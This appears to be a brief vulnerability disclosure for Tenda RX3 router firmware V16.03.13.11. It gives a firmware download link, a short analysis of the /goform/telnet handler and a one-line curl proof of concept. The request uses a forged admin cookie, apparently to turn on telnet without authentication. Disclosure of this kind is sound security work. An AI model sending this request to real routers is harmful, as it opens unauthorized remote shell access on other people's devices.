| Firmware Name | Firmware Version   | Download Link                                                |
| ------------- | ------------------ | ------------------------------------------------------------ |
| RX3           | V16.03.13.11_multi | https://static.tenda.com.cn/tdeweb/download/RX3/US_RX3V1.0br_V16.03.13.11_multi_TDE01.zip |

## Analysis

![74d9a822fc4ad00b46952ca767ab8f1](./assets/74d9a822fc4ad00b46952ca767ab8f1.png)

An HTTP request within the handler function of the /goform/telnet route. This could lead to Shell Metacharacters.

## POC

```
curl -i -X POST http://192.168.0.1/goform/telnet -d aa=aa --cookie "user=admin" --http0.9
```

![c637793fb26c4049fd46050b2e745f1](./assets/c637793fb26c4049fd46050b2e745f1.png)